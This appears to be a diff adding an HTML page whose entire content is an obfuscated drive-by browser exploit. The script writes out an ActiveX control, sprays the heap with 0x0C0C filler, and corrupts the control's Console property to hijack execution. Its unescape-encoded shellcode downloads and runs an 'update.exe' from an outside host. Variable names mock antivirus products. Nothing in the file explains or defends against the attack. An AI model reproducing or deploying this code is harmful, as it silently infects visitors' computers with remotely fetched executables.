@@ -1,0 +1,50 @@
+<script>window.onerror=function(){return true;}</script>
+<script>
+document.writeln("<html>");
+document.writeln("<object classid=\"clsid:2F542A2E-EDC9-4BF7-8CB1-87C9919F7F93\" id=\"obj\">");
+document.writeln("<\/object>");
+document.writeln("  <script language=\"JavaScript\">");
+document.writeln("        var loverising = window[\"unescape\"](\"%u0C0C%u0C0C\");");
+document.writeln("	var fuckyoukaspersky = 20;");
+document.writeln("function kaspersky() {");
+document.writeln("var lovekaspersky1 = window[\"unescape\"](\"%u54EB%u758B%u8B3C\");");
+document.writeln("var lovekaspersky2 = window[\"unescape\"](\"%u3574%u0378%u56F5%u768B%u0320%u33F5%u49C9\");");
+document.writeln("var lovekaspersky3 = window[\"unescape\"](\"%uAD41%uDB33%u0F36%u14BE%u3828%u74F2%uC108\");");
+document.writeln("var lovekaspersky4 = window[\"unescape\"](\"%u0DCB%uDA03%uEB40%u3BEF%u75DF%u5EE7%u5E8B\");");
+document.writeln("var lovekaspersky5 = window[\"unescape\"](\"%u0324%u66DD%u0C8B%u8B4B%u1C5E%uDD03%u048B\");");
+document.writeln("var lovekaspersky6 = window[\"unescape\"](\"%u038B%uC3C5%u7275%u6D6C%u6E6F%u642E%u6C6C\");");
+document.writeln("var lovekaspersky7 = window[\"unescape\"](\"%u4300%u5C3A%u2e55%u7865%u0065%uC033%u0364\");");
+document.writeln("var lovekaspersky8 = window[\"unescape\"](\"%u3040%u0C78%u408B%u8B0C%u1C70%u8BAD%u0840\");");
+document.writeln("var lovekaspersky9 = window[\"unescape\"](\"%u09EB%u408B%u8D34%u7C40%u408B%u953C%u8EBF\");");
+document.writeln("var lovekaspersky10 = window[\"unescape\"](\"%u0E4E%uE8EC%uFF84%uFFFF%uEC83%u8304%u242C\");");
+document.writeln("var lovekasperskya = window[\"unescape\"](\"%uFF3C%u95D0%uBF50%u1A36%u702F%u6FE8%uFFFF\");");
+document.writeln("var lovekasperskyb = window[\"unescape\"](\"%u8BFF%u2454%u8DFC%uBA52%uDB33%u5353%uEB52\");");
+document.writeln("var lovekasperskyc = window[\"unescape\"](\"%u5324%uD0FF%uBF5D%uFE98%u0E8A%u53E8%uFFFF\");");
+document.writeln("var lovekasperskyd = window[\"unescape\"](\"%u83FF%u04EC%u2C83%u6224%uD0FF%u7EBF%uE2D8\");");
+document.writeln("var lovekasperskye = window[\"unescape\"](\"%uE873%uFF40%uFFFF%uFF52%uE8D0%uFFD7%uFFFF\");");
+document.writeln("var lovekasperskyf = window[\"unescape\"](\"%u7468%u7074%u2f3a%u772f%u7777%u742e%u6279%u6867%u632e%u2f6e%u7075%u6164%u6574%u652e%u6578%u0000\");");
+document.writeln("var lovekaspersky=lovekaspersky1+lovekaspersky2+lovekaspersky3+lovekaspersky4+lovekaspersky5+lovekaspersky6+lovekaspersky7+lovekaspersky8+lovekaspersky9+lovekaspersky10+lovekasperskya+lovekasperskyb+lovekasperskyc+lovekasperskyd+lovekasperskye+lovekasperskyf;");
+document.writeln("	var fukcyourising = fuckyoukaspersky + lovekaspersky.length;");
+document.writeln("	while (loverising.length < fukcyourising) loverising += loverising;");
+document.writeln("	var fillhellonorton = loverising.substring(0,fukcyourising);");
+document.writeln("	var hellonorton = loverising.substring(0,loverising.length - fukcyourising);");
+document.writeln("	while (hellonorton.length + fukcyourising < 0x40000) hellonorton = hellonorton + hellonorton + fillhellonorton;");
+document.writeln("	var daidai = new Array();");
+document.writeln("        var youfuck = daidai;");
+document.writeln("	for (i = 0; i < 300; i++){ youfuck[i] = hellonorton + lovekaspersky }");
+document.writeln("	var buf = \'\';");
+document.writeln("	while (buf.length < 32) buf = buf + window[\"unescape\"](\"%0C\");");
+document.writeln("	var good_flow = obj.Console;");
+document.writeln("	obj.Console = buf;");
+document.writeln("	obj.Console = good_flow;");
+document.writeln("	good_flow = obj.Console;");
+document.writeln("	obj.Console = buf;");
+document.writeln("	obj.Console = good_flow;");
+document.writeln(" } ");
+document.writeln("{");
+document.writeln("kaspersky();");
+document.writeln("}");
+document.writeln("<\/script>");
+document.writeln("<\/html>");
+document.writeln("")
+</script>
